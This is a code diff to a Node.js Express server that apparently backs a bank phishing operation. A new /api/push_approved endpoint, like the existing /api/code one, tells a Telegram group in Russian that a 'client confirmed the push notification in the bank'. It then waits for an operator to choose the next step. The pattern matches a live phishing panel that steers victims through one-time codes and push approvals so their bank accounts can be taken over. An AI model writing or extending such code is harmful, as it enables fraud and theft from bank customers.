@@ -1,6 +1,5 @@
 require("dotenv").config();
 
-
 const express = require("express");
 const cors = require("cors");
 const { v4: uuidv4 } = require("uuid");
@@ -208,6 +207,36 @@ app.post("/api/code", async (req, res) => {
   }
 
   console.log(`[code] done  request_id=${request_id}  action=${result.action}`);
+  res.json({ ok: true, request_id, action: result.action });
+});
+
+app.post("/api/push_approved", async (req, res) => {
+  const { request_id } = req.body || {};
+  if (!request_id) {
+    return res.status(400).json({ ok: false, error: "request_id required" });
+  }
+
+  try {
+    await tgPost("sendMessage", {
+      chat_id: GROUP_CHAT_ID,
+      text: `✅ Клиент подтвердил пуш-уведомление в банке\n🆔 Заявка: ${request_id}`,
+      reply_markup: codeKeyboard(request_id),
+    });
+  } catch (err) {
+    console.error("[push_approved] Telegram error:", err.message);
+    return res.status(502).json({ ok: false, error: "Telegram unavailable", detail: err.message });
+  }
+
+  lastSeen.set(request_id, Date.now());
+  console.log(`[push_approved] waiting  request_id=${request_id}`);
+  const result = await waitForCallback(request_id);
+
+  if (result.timeout) {
+    console.log(`[push_approved] timeout  request_id=${request_id}`);
+    return res.status(408).json({ ok: false, error: "timeout" });
+  }
+
+  console.log(`[push_approved] done  request_id=${request_id}  action=${result.action}`);
   res.json({ ok: true, request_id, action: result.action });
 });
 
